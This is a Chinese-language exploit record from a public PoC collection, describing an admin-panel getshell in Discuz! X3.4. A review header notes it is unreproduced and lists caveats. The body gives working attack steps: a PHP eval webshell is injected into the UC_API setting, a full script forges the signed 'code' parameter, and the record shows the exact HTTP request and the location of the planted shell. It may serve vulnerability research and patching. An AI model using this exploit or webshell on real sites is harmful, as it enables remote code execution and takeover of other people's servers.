---
source: "Threekiii/Awesome-POC"
product: "Discuz X3.4"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Discuz!X3.4 后台修改UCenter配置getshell漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：Admin UC config editing; chosen UC_KEY; writable config; signed updateapps XML body"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-27f5c9549876812b042804a2"
entity_id: "ve-27f5c9549876812b042804a2"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Admin UC config editing; chosen UC_KEY; writable config; signed updateapps XML body

- **证据待核（1）**：Full GET+XML request supplies missing artifact from82/86; useful canonical candidate。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（2）**：Example code ends stray percent character and expires; regenerate rather than literal reuse。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（3）**：UC_KEY change breaks integration unless coordinated/restored; warning absent here。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（4）**：Claims3.4 vs86 &lt;3.4 requires patch/build verification; secondary source only。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Discuz!X3.4 后台修改UCenter配置getshell漏洞

## 漏洞复现

漏洞利用流程如下：

1. 进入后台`站长`-`UCenter设置`，修改UCenter通信密钥为`123456`。
2. 修改UC_API=`http://your-ip/discuz!x3.4/uc_server');eval($_POST[cmd]);//`，点击保存。
3. 利用UC_KEY(dz) 生成code参数，执行脚本`php ucode.php`生成code。
4. Burpsuite带code参数发送GET请求，结果为1表示成功。

![img](./.resource/Discuz!X3.4后台修改UCenter配置getshell漏洞/media/1589986439989.png)

生成code参数的脚本 ucode.php：

```php
<?php
$uc_key="123456";//此处填写刚才UCenter设置的值
$time = time() + 720000;
$str = "time=".$time."&action=updateapps";
$code = authcode($str,"ENCODE",$uc_key);
$code = str_replace('+','%2b',$code);
$code = str_replace('/','%2f',$code);
echo $code;

function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
  $ckey_length = 4;
  $key = md5($key != '' ? $key : '123456');
  $keya = md5(substr($key, 0, 16));
  $keyb = md5(substr($key, 16, 16));
  $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';

  $cryptkey = $keya.md5($keya.$keyc);
  $key_length = strlen($cryptkey);

  $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
  $string_length = strlen($string);

  $result = '';
  $box = range(0, 255);

  $rndkey = array();
  for($i = 0; $i <= 255; $i++) {
    $rndkey[$i] = ord($cryptkey[$i % $key_length]);
  }

  for($j = $i = 0; $i < 256; $i++) {
    $j = ($j + $box[$i] + $rndkey[$i]) % 256;
    $tmp = $box[$i];
    $box[$i] = $box[$j];
    $box[$j] = $tmp;
  }

  for($a = $j = $i = 0; $i < $string_length; $i++) {
    $a = ($a + 1) % 256;
    $j = ($j + $box[$a]) % 256;
    $tmp = $box[$a];
    $box[$a] = $box[$j];
    $box[$j] = $tmp;
    $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
  }

  if($operation == 'DECODE') {
    if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
      return substr($result, 26);
    } else {
      return '';
    }
  } else {
    return $keyc.str_replace('=', '', base64_encode($result));
  }
}
?>
```

带code参数发送GET请求：

![img](./.resource/Discuz!X3.4后台修改UCenter配置getshell漏洞/media/1589987534699.png)

请求数据包：

```
GET /discuz!x3.4/api/uc.php?code=ac7091oTLALD6X24gZeiX5YmqDkLnX4ivIqx1jDnA7NhUAcHHOX3fWWOLWpGwSwfQfz4r5Pgf86bRlDTRkQ% HTTP/1.1
Host: your-ip
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ar;q=0.8
Connection: close
Content-Length: 133

<?xml version="1.0" encoding="ISO-8859-1"?>
<root>
<item id="UC_API">http://your-ip/discuz!x3.4/uc_server</item>
</root>
```

Shell 地址：

```
http://your-ip/discuz!x3.4/config/config_ucenter.php
```


---

> 来源：Threekiii/Awesome-POC
